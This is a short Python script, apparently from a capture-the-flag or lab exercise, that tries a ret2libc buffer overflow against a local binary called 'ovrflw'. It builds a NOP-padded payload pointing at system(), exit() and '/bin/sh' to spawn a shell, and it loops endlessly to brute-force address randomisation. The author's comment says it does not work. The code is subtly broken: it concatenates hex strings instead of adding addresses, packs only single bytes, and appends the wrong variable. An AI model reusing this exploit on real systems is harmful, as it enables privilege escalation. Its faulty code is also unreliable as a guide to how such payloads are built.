#!/usr/bin/python3
#Cant get this to work, I know its close but I know the basic way to do it way better

import struct, subprocess

libcBase = b'0xb75e5000'
systemOffset = b'0x00040310'
binShOffset = b'0x00162bac'
exitOffset = b'0x00033260'

libcAddress = struct.pack("<s", libcBase + systemOffset)
exitAddress = struct.pack("<s", exitOffset)
binShAddress = struct.pack("<s", libcBase + binShOffset)

payload = b"\x90" * 112
payload += libcAddress
payload += exitAddress
payload += binShOffset

i = 0
while True:
    i += 1
    if i%10 == 0:
        print("Attempts: " + str(i))
    subprocess.call(["/usr/local/bin/ovrflw", payload])
